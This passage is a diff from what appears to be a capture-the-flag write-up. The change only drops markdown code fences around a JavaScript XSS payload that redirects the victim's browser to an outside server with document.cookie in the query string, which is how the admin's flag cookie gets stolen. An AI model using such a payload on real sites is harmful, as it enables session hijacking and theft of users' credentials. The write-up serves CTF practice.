@@ -44,7 +44,7 @@ the challenge outide of the network.
 	the server and appends the admins cookies to the query string.
 	The server can then log the cookie containing the flag to the console.
 
-	```javascript
+	
 	(()=>{location.href="http://server-domain/?flag=" + document.cookie})()
-	``` 
+	
 </details>
